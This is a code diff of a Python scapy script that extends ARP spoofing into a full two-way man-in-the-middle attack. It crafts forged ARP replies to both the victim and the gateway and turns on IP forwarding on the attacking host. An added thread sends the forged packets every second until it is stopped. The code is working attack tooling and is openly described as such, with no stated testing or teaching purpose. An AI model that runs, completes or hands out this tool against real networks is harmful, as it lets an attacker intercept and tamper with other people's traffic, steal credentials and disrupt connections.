@@ -2,6 +2,8 @@ import subprocess
 import re
 import ipaddress
 from scapy.all import ARP, Ether, srp, send
+import threading
+import time
 
 def get_gateway_info():
     """
@@ -59,35 +61,99 @@ def scan_network(ip_range):
     except Exception as e:
         raise RuntimeError(f"Error scanning network: {e}") from e
 
-def spoof_target(victim_ip, victim_mac, gateway_ip):
+def spoof_both(victim_ip, victim_mac, gateway_ip, gateway_mac):
     """
-    Sends an unsolicited ARP response to the target, telling it the attacker's computer is the router.
+    Spoofs both the victim and the gateway to enable a man-in-the-middle attack.
 
     Args:
-        victim_ip (str): IP address of the victim to spoof.
+        victim_ip (str): IP address of the victim.
         victim_mac (str): MAC address of the victim.
         gateway_ip (str): IP address of the gateway.
-    
+        gateway_mac (str): MAC address of the gateway.
+
     Returns:
-        dict: Details about the ARP packet, including source MAC (hwsrc), target MAC (hwdst), target IP (pdst), and spoofed source IP (psrc).
+        dict: Details about the spoofing actions for both victim and gateway.
     """
     try:
-        # Create the ARP packet
-        packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip)
-        
-        # Print debug information for testing
-        print(packet.show())
-        print(packet.summary())
-        
-        # Uncomment the send line in production
-        # send(packet, verbose=False)
+        # ARP spoofing packet for the victim (pretend to be the gateway)
+        victim_packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip)
 
-        # Return details for the message
+        # ARP spoofing packet for the gateway (pretend to be the victim)
+        gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip)
+        print("Victim_packet")
+        print(victim_packet.show())
+        print(victim_packet.summary())
+        
+        print("Gateway_packet")
+        print(gateway_packet.show())
+        print(gateway_packet.summary())
+
+        # Uncomment these lines in production to send the packets
+        # send(victim_packet, verbose=False)
+        # send(gateway_packet, verbose=False)
+
+        # Return debug information for both spoofing actions
         return {
-            "hwsrc": packet.hwsrc,  # Attacker's MAC address
-            "hwdst": packet.hwdst,  # Victim's MAC address
-            "pdst": packet.pdst,    # Victim's IP address
-            "psrc": packet.psrc     # Spoofed source IP (gateway IP)
+            "victim_spoof": {
+                "hwsrc": victim_packet.hwsrc,
+                "hwdst": victim_packet.hwdst,
+                "pdst": victim_packet.pdst,
+                "psrc": victim_packet.psrc
+            },
+            "gateway_spoof": {
+                "hwsrc": gateway_packet.hwsrc,
+                "hwdst": gateway_packet.hwdst,
+                "pdst": gateway_packet.pdst,
+                "psrc": gateway_packet.psrc
+            }
         }
     except Exception as e:
         raise RuntimeError(f"Error during ARP spoofing: {e}")
+    
+    
+# Global variable to control the spoofing thread
+spoofing_active = False
+
+def enable_port_forwarding():
+    """
+    Enable port forwarding on the host machine by writing to /proc/sys/net/ipv4/ip_forward.
+    """
+    try:
+        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+            f.write("1")
+    except Exception as e:
+        raise RuntimeError(f"Failed to enable port forwarding: {e}")
+
+def start_spoofing_continuous(victim_ip, victim_mac, gateway_ip, gateway_mac):
+    """
+    Start sending spoofing packets continuously in a separate thread.
+    """
+    def spoofing_thread():
+        global spoofing_active
+        while spoofing_active:
+            # Send spoofing packets
+            victim_packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip)
+            gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip)
+            print("victim_packet")
+            print(victim_packet.show())
+            print(victim_packet.summary())
+            print("Gateway_packet")
+            print(gateway_packet.show())
+            print(gateway_packet.summary())
+            send(victim_packet, verbose=False)
+            send(gateway_packet, verbose=False)
+            time.sleep(1)  # Send a packet every second
+
+    global spoofing_active
+    spoofing_active = True
+    enable_port_forwarding()  # Enable port forwarding
+    thread = threading.Thread(target=spoofing_thread)
+    thread.daemon = True
+    thread.start()
+
+def stop_spoofing():
+    """
+    Stop the continuous spoofing process.
+    """
+    global spoofing_active
+    spoofing_active = False
